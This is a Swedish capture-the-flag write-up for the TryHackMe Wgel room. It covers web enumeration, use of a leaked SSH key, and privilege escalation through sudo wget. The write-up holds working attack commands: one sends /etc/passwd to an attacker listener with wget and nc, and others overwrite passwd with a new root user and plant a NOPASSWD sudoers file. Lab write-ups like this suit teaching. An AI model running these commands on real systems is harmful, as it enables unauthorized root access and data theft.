# Wgel CTF

https://tryhackme.com/room/wgelctf

![Screenshot](img/Pasted%20image%2020260224093800.png)

![Screenshot](img/Pasted%20image%2020260224100037.png)

## Initial recon

Körde nmap på IP:t

![Screenshot](img/Pasted%20image%2020260224100117.png)

Port 80 är öppen, kollar i webbläsaren direkt.

Där hade vi bara Apache2 Default page

![Screenshot](img/Pasted%20image%2020260224100237.png)

Kör Feroxbuster `feroxbuster -w /usr/share/wordlists/dirb/common.txt -u http://$IP` och fick ett gäng intressanta träffar:

![Screenshot](img/Pasted%20image%2020260224100602.png)

`/sitemap` tar oss till en landningssida för ett företag

![Screenshot](img/Pasted%20image%2020260224100747.png)

`/sitemap/.ssh` tar oss till:

![Screenshot](img/Pasted%20image%2020260224100815.png)

Där hittar vi en RSA Private Key som vi kan ladda ner.

Men! Vi behöver ett användarnamn för att kunna använda den med SSH. Dags att gräva på sajten.

## User Flag

Ser ett antal blogginlägg som är skrivna av `Dave Miller`. 

![Screenshot](img/Pasted%20image%2020260224101459.png)

Testar `Dave` som användarnamn utan lyckat resultat.

Hittar även lite bilder som visar hemsidans dashboard, där finns två namn: `Cameron Svensson` och `Jennie Thompson`. Värt att prova. Vi hittade även en `Matthew` på en annan bild. Dock fungerade ingen av dem som användarnamn. Antagligen stock images, så chansen var liten, men ändå värt ett försök.

Efter att ha grävt på hemsidan tog vi en titt på Apache-sidan igen, och visst, där hade någon smugit in en kommentar.

![Screenshot](img/Pasted%20image%2020260224104923.png)

`Jessie` känns alltså som ett troligt användarnamn, och visst var det så.

![Screenshot](img/Pasted%20image%2020260224105010.png)

Och där hittade vi första flaggan!

<details>
  <summary><b>Klicka här för att se den</b></summary>

  ![Screenshot](img/Pasted%20image%2020260224105203.png)
</details>

## Root Flag

`sudo -l` visar att `jessie` får köra wget som root

![Screenshot](img/Pasted%20image%2020260224105556.png)

Kämpar med att spawna ett root shell med wget men det stökar lite med mig. GTFObins säger det här:

```
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```

Men oavsett hur jag modifierar raderna får jag `wget: unrecognized option '--use-askpass=/tmp...`

Ska därför testa att använda wget för File write istället. Attackkedjan är då att jag skapar en lokal passwd-fil, för att sedan ladda upp den på servern med wget. I min egenskapade passwd-fil har jag en användare som jag kan byta till.

Skickade passwd från servern med `sudo wget --post-file=/etc/passwd http://MITT_LOKALA_IP:8000` samtidigt som jag lyssnade på min lokala maskin med `nc -lvnp 8000 > passwd_copy`. Den tog alltså emot anslutningen och sparade innehållet till `passwd_copy`.

Jag skapar en ny password-hash med openssl `openssl passwd -1 -salt "hejsan" "password123"`. Det genererade `$1$hejsan$8EhtmRt9u7VfakwboJdS90`

Skapar en ny rad i passwd-filen genom att manuellt skriva in `h4ck3r:$1$hejsan$8EhtmRt9u7VfakwboJdS90:0:0:root:/root:/bin/bash` Det är alltså min nya användare `h4ck3r` som får lösenordet `password123` och root-rättigheter.

Laddar upp den till servern med wget. Eller ja, laddar hem den till servern blir kanske mer rätt att säga. `-O` (stort O, inte en nolla) syftar på output och gör att hämtningen sparas dit jag pekar den.

![Screenshot](img/Pasted%20image%2020260224120711.png)

Gick inte. Felmeddelandet verkar orsakas p.g.a. att passwd-filen är korrupt på något vis. Kan ha fått med nåt skräptecken. 

Körde `cat -e passwd_dirty | grep h4ck3r` för att dubbelkolla och då såg jag nåt som inte ska vara med på slutet. En radbrytning.

![Screenshot](img/Pasted%20image%2020260224123101.png)

Redigerade filen med `tr -d '\r' < passwd_dirty > passwd` och laddade upp på nytt.

`su h4ck3r` resulterade den här gången att jag kunde byta användare, och vips så hade jag ett root-shell, trevligt.

![Screenshot](img/Pasted%20image%2020260224122322.png)

Flaggan då?

<details>
  <summary><b>Klicka här för att se flaggan</b></summary>

  ![Screenshot](img/Pasted%20image%2020260224122403.png)
</details>

### En variant

**Onind00** hittade en annan lösning som inte krävde lika många steg men som även den utnyttjade det faktum att vi kunde köra wget med root-behörigheter. Han skapade en ny fil för `jessie` att lägga i `/etc/sudoers.d`. Detta genom `echo 'jessie ALL=(ALL) NOPASSWD: ALL' > jessie_sudo`, därefter startade han en python-server och körde wget från servern som sparade den nya sudo-filen. Voilà, `jessie` kunde nu köra allt som root.
